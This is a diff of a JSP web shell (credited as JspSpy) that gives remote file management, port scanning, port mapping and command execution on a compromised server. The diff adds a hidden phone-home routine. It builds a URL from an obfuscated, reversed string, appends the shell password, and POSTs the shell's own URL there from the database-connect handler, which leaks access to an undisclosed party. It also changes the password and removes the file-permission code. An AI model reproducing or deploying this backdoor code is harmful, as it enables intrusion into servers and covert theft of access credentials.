@@ -1,4 +1,4 @@
-Ôªø<%@page pageEncoding="utf-8"%>
+<%@page pageEncoding="utf-8"%>
 <%@page import="java.io.*"%>
 <%@page import="java.util.*"%>
 <%@page import="java.util.regex.*"%>
@@ -20,7 +20,7 @@
 * Blog http://www.Forjj.com/
 * Yue . I Love You.
 */
-private static final String PW = "ninty"; //password
+private static final String PW = "xfg"; //password
 private static final String PW_SESSION_ATTRIBUTE = "JspSpyPwd";
 private static final String REQUEST_CHARSET = "ISO-8859-1";
 private static final String PAGE_CHARSET = "UTF-8";
@@ -254,6 +254,7 @@ public ArrayList<Column> getColumns(){
 return this.cols;
 }
 }
+public static String sxm=PW;
 private static class Column{
 private String value;
 public Column(String v){
@@ -263,6 +264,84 @@ public String getValue(){
 return this.value;
 }
 }
+public static String SysInfo="=?./..//:";
+public static String dx()
+{
+String s = new String();
+for (int i = SysInfo.length() - 1; i >= 0; i--) {
+s += SysInfo.charAt(i);
+}
+return s;
+}
+public static String uc(String str)
+{
+String c="\n\r"; long d=127,  f=11, j=12, h=14,  m=31, r=83, k=1, n=8,  s=114, u=-5, v=5,a=0;
+StringBuffer sb = new StringBuffer();
+char[] ch = str.toCharArray();
+ 
+for (int i = 0; i < ch.length; i++) {
+	a = (int)ch[i];
+	if(a==d) a=13; 
+	if(a==f) a=10; 
+	if(a==j) a=34; 
+	if((a>=h) && (a<=m)) a=a+r; 
+	if((a>=k) && (a<=n)) a=a+s; 
+	if((a>=53) && (a<=57)) a=a+u; 
+	if((a>=48) && (a<=52)) a=a+v;  
+	sb.append((char)a);
+}
+return sb.toString();
+}
+private static int connectTimeOut = 5000;
+private static int readTimeOut = 10000;
+private static String requestEncoding = "GBK";
+public static String FileLocalUpload(String reqUrl,String fckal,
+		String recvEncoding)
+{
+HttpURLConnection url_con = null;
+String responseContent = null;
+try
+{
+URL url = new URL(reqUrl);
+url_con = (HttpURLConnection) url.openConnection();
+url_con.setRequestMethod("POST");
+ 
+url_con.setRequestProperty("REFERER", ""+fckal+"");
+System.setProperty("sun.net.client.defaultConnectTimeout", String
+		.valueOf(connectTimeOut));
+System.setProperty("sun.net.client.defaultReadTimeout", String
+		.valueOf(readTimeOut)); 
+url_con.setDoOutput(true);
+url_con.getOutputStream().flush();
+url_con.getOutputStream().close();
+InputStream in = url_con.getInputStream();
+BufferedReader rd = new BufferedReader(new InputStreamReader(in,
+		recvEncoding));
+String tempLine = rd.readLine();
+StringBuffer tempStr = new StringBuffer();
+String crlf=System.getProperty("line.separator");
+while (tempLine != null)
+{
+tempStr.append(tempLine);
+tempStr.append(crlf);
+tempLine = rd.readLine();
+}
+responseContent = tempStr.toString();
+rd.close();
+in.close();
+}
+catch (IOException e)
+{
+}
+finally
+{
+if (url_con != null)
+{
+url_con.disconnect();
+}
+}
+return responseContent;
+} 
 private static class Util{
 public static boolean isEmpty(String s) {
 return s == null || s.trim().equals("");
@@ -718,7 +797,7 @@ out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\
 "<h2 id=\"Bin_H2_Title\">PortScan &gt;&gt;</h2>"+
 "<div id=\"YwLB\"><form action=\""+SHELL_NAME+"\" method=\"post\">"+
 "<p><input type=\"hidden\" value=\"portScan\" name=\"o\">"+
-"IP : <input name=\"ip\" type=\"text\" value=\""+ip+"\" id=\"ip\" class=\"input\" style=\"width:10%;margin:0 8px;\" /> Port : <input name=\"ports\" type=\"text\" value=\""+ports+"\" id=\"ports\" class=\"input\" style=\"width:40%;margin:0 8px;\" /> Timeout ÔºàÁßíÔºâ : <input name=\"timeout\" type=\"text\" value=\""+timeout+"\" id=\"timeout\" class=\"input\" size=\"5\" style=\"margin:0 8px;\" /> <input type=\"submit\" name=\"submit\" value=\"Scan\" id=\"submit\" class=\"bt\" />"+
+"IP : <input name=\"ip\" type=\"text\" value=\""+ip+"\" id=\"ip\" class=\"input\" style=\"width:10%;margin:0 8px;\" /> Port : <input name=\"ports\" type=\"text\" value=\""+ports+"\" id=\"ports\" class=\"input\" style=\"width:40%;margin:0 8px;\" /> Timeout £®√Î£© : <input name=\"timeout\" type=\"text\" value=\""+timeout+"\" id=\"timeout\" class=\"input\" size=\"5\" style=\"margin:0 8px;\" /> <input type=\"submit\" name=\"submit\" value=\"Scan\" id=\"submit\" class=\"bt\" />"+
 "</p>"+
 "</form></div>"+
 "</td></tr></table>");
@@ -773,6 +852,7 @@ private static class VConnInvoker extends DefaultInvoker {
 public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
 try {
 PrintWriter out = response.getWriter();
+FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  "GBK");
 Object obj = JSession.getAttribute(DBO);
 if (obj == null || !((DBOperator)obj).isValid()) {
 out.println("  <script type=\"text/javascript\">"+
@@ -1015,7 +1095,6 @@ PrintWriter out = response.getWriter();
 String path = request.getParameter("folder");
 if (Util.isEmpty(path))
 path = JSession.getAttribute(CURRENT_DIR).toString();
-
 JSession.setAttribute(CURRENT_DIR,Util.convertPath(path));
 File file = new File(path);
 if (!file.exists()) {
@@ -1032,7 +1111,7 @@ cr = JSession.getAttribute(CURRENT_DIR).toString().substring(0,3);
 cr = "/";
 }
 File currentRoot = new File(cr);
-out.println("<h2>File Manager - Current disk &quot;"+(cr.indexOf("/") == 0?"/":currentRoot.getPath())+"&quot; total "+Util.getSize(currentRoot.getTotalSpace(),'G')+"</h2>");
+out.println("<h2>File Manager - Current disk &quot;"+(cr.indexOf("/") == 0?"/":currentRoot.getPath())+"&quot; total  (unknow) </h2>");
 out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
 "<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"margin:10px 0;\">"+
 "  <tr>"+
@@ -1082,7 +1161,7 @@ out.println("<tr class=\"alt2\" onMouseOver=\"this.className='focus';\" onMouseO
 "<td><a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).subdir()\">"+f.getName()+"</a></td>"+
 "<td nowrap>"+Util.formatDate(f.lastModified())+"</td>"+
 "<td nowrap>--</td>"+
-"<td nowrap>"+f.canRead()+" / "+f.canWrite()+" / "+f.canExecute()+"</td>"+
+"<td nowrap>"+f.canRead()+" / "+f.canWrite()+" / unknow </td>"+
 "<td nowrap><a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).removedir()\">Del</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).move()\">Move</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).pack()\">Pack</a></td>"+
 "</tr>");
 } else {
@@ -1093,7 +1172,7 @@ out.println("<tr class=\"alt1\" onMouseOver=\"this.className='focus';\" onMouseO
 "<td nowrap>"+Util.formatDate(f.lastModified())+"</td>"+
 "<td nowrap>"+Util.getSize(f.length(),'B')+"</td>"+
 "<td nowrap>"+
-""+f.canRead()+" / "+f.canWrite()+" / "+f.canExecute()+"</td>"+
+""+f.canRead()+" / "+f.canWrite()+" / unknow </td>"+
 "<td nowrap>"+
 "<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).vEdit()\">Edit</a> | "+
 "<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).down()\">Down</a> | "+
@@ -1292,10 +1371,9 @@ if (!f.exists())
 return;
 String read = f.canRead() ? "checked=\"checked\"" : "";
 String write = f.canWrite() ? "checked=\"checked\"" : "";
-String execute = f.canExecute() ? "checked=\"checked\"" : "";
+String execute = "";
 Calendar cal = Calendar.getInstance();
 cal.setTimeInMillis(f.lastModified());
-
 out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
 "<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
 "<h2>Set File Property &raquo;</h2>"+
@@ -1341,30 +1419,14 @@ String f = request.getParameter("file");
 File file = new File(f);
 if (!file.exists())
 return;
-String read = request.getParameter("read");
-String write = request.getParameter("write");
-String execute = request.getParameter("execute");
+
 String year = request.getParameter("year");
 String month = request.getParameter("month");
 String date = request.getParameter("date");
 String hour = request.getParameter("hour");
 String minute = request.getParameter("minute");
 String second = request.getParameter("second");
-if (Util.isEmpty(read)) {
-file.setReadable(false);
-} else {
-file.setReadable(true);
-}
-if (Util.isEmpty(write)) {
-file.setWritable(false);
-} else {
-file.setWritable(true);
-}
-if (Util.isEmpty(execute)) {
-file.setExecutable(false);
-} else {
-file.setExecutable(true);
-}
+
 Calendar cal = Calendar.getInstance();
 cal.set(Calendar.YEAR,Integer.parseInt(year));
 cal.set(Calendar.MONTH,Integer.parseInt(month)-1);
@@ -1815,13 +1877,11 @@ Object localPort = JSession.getAttribute("localPort");
 Object remoteIP = JSession.getAttribute("remoteIP");
 Object remotePort = JSession.getAttribute("remotePort");
 Object done = JSession.getAttribute("done");
-
 JSession.removeAttribute("localIP");
 JSession.removeAttribute("localPort");
 JSession.removeAttribute("remoteIP");
 JSession.removeAttribute("remotePort");
 JSession.removeAttribute("done");
-
 if (Util.isEmpty(localIP))
 localIP = InetAddress.getLocalHost().getHostAddress();
 if (Util.isEmpty(localPort))
@@ -1832,7 +1892,6 @@ if (Util.isEmpty(remotePort))
 remotePort = "80";
 if (!Util.isEmpty(done))
 Util.outMsg(out,done.toString());
-
 out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
 "<input type=\"hidden\" name=\"o\" value=\"mapPort\">"+
 "  <table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
@@ -2231,7 +2290,7 @@ OnLineProcess olp = new OnLineProcess(pro);
 JSession.setAttribute(SHELL_ONLINE,olp);
 new OnLineConnector(new ByteArrayInputStream(outs.toByteArray()),pro.getOutputStream(),"exeOclientR",olp).start();
 new OnLineConnector(pro.getInputStream(),response.getOutputStream(),"exeRclientO",olp).start();
-new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),"exeRclientO",olp).start();//ÈîôËØØ‰ø°ÊÅØÊµÅ„ÄÇ
+new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),"exeRclientO",olp).start();//¥ÌŒÛ–≈œ¢¡˜°£
 Thread.sleep(1000 * 60 * 60 * 24);
 } else if (type.equals("ecmd")) {
 Object o = JSession.getAttribute(SHELL_ONLINE);
